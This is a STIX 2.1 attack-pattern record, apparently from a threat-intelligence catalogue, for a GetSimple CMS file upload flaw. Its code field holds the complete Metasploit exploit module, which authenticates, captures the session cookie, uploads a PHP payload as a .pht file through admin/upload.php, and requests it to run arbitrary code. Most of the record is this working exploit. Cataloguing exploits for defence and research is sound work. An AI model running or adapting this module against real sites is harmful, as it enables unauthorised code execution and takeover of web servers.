{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--e9521609-9465-4ccc-b2bd-df9a7c688e29",
    "created": "2024-08-14T17:12:01.268682Z",
    "modified": "2024-08-14T17:12:01.268686Z",
    "name": "GetSimpleCMS PHP File Upload Vulnerability",
    "description": " This module exploits a file upload vulnerability in GetSimple CMS. By abusing the upload.php file, a malicious authenticated user can upload an arbitrary file including PHP code, which results in arbitrary code execution. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/get_simple_cms_upload_exec.rb",
            "external_id": "get_simple_cms_upload_exec.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'GetSimpleCMS PHP File Upload Vulnerability',\n      'Description'    => %q{\n        This module exploits a file upload vulnerability in GetSimple CMS. By abusing the\n        upload.php file, a malicious authenticated user can upload an arbitrary file,\n        including PHP code, which results in arbitrary code execution.\n      },\n      'Author'         =>\n        [\n          'Ahmed Elhady Mohamed'\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          ['EDB', '25405'],\n          ['OSVDB', '93034']\n        ],\n      'Payload'        =>\n        {\n          'BadChars' => \"\\x00\",\n        },\n      'Platform'       => 'php',\n      'Arch'           => ARCH_PHP,\n      'Targets'        =>\n        [\n          ['Generic (PHP Payload)', {}]\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2014-01-04'\n    ))\n\n    register_options([\n      OptString.new('TARGETURI', [true, 'The full URI path to GetSimplecms', '/GetSimpleCMS']),\n      OptString.new('USERNAME', [true, 'The username that will be used for authentication process']),\n      OptString.new('PASSWORD', [true, 'The right password for the provided username'])\n    ])\n  end\n\n  def send_request_auth\n    res = send_request_cgi({\n      'method'    => 'POST',\n      'uri'       => normalize_uri(target_uri.path.to_s, \"admin\", \"index.php\"),\n      'vars_post' => {\n        'userid'    => \"#{datastore['USERNAME']}\",\n        'pwd'       => \"#{datastore['PASSWORD']}\",\n        'submitted' => 'Login'\n      }\n    })\n\n    res\n  end\n\n  def send_request_upload(payload_name, cookie_http_header)\n    data = Rex::MIME::Message.new\n    data.add_part(\"<?php #{payload.encoded} ?>\", 'application/x-httpd-php', nil, \"form-data; name=\\\"file[]\\\"; filename=\\\"#{payload_name}\\\"\")\n    data.add_part(\"Upload\", nil, nil, \"form-data; name=\\\"submit\\\"\")\n\n    data_post = data.to_s\n\n    res = send_request_cgi({\n      'method'   => 'POST',\n      'uri'      => normalize_uri(target_uri.path.to_s, \"admin\", \"upload.php\"),\n      'vars_get' => { 'path' =>'' },\n      'cookie'   => cookie_http_header,\n      'ctype'    => \"multipart/form-data; boundary=#{data.bound}\",\n      'data'     => data_post\n    })\n\n    res\n  end\n\n  def check\n    res = send_request_cgi({'uri' => normalize_uri(target_uri.path.to_s, 'admin', 'index.php')})\n\n    if res && res.code == 200 && res.body && res.body.to_s =~ /GetSimple CMS.*Version\\s*([0-9\\.]+)/\n      version = $1\n    else\n      return Exploit::CheckCode::Unknown\n    end\n\n    print_status(\"Version #{version} found\")\n\n    if Rex::Version.new(version) <= Rex::Version.new('3.1.2')\n      return Exploit::CheckCode::Appears\n    end\n\n    Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    print_status(\"Authenticating...\")\n    res = send_request_auth\n\n    if res && res.code == 302\n      print_good(\"The authentication process is done successfully!\")\n    else\n      fail_with(Failure::NoAccess, \"#{peer} - Authentication failed\")\n    end\n\n    print_status(\"Extracting Cookies Information...\")\n    cookie = res.get_cookies\n    if cookie.blank?\n      fail_with(Failure::NoAccess, \"#{peer} - Authentication failed\")\n    end\n\n    print_status(\"Uploading payload...\")\n    payload_name = rand_text_alpha_lower(rand(10) + 5) + '.pht'\n    res = send_request_upload(payload_name, cookie)\n\n    if res && res.code == 200 && res.body && res.body.to_s =~ /Success! File location.*>.*#{target_uri.path.to_s}(.*)#{payload_name}</\n      upload_path = $1\n      print_good(\"File uploaded to #{upload_path}\")\n      register_file_for_cleanup(payload_name)\n    else\n      fail_with(Failure::Unknown, \"#{peer} - Upload failed\")\n    end\n\n    print_status(\"Executing payload...\")\n    send_request_raw({\n      'uri' => normalize_uri(target_uri.path.to_s, upload_path, payload_name),\n      'method' => 'GET'\n    }, 5)\n  end\nend\n",
    "x_mitre_disclosure_date": "2014-01-04",
    "x_mitre_platforms": [
        "php'"
    ]
}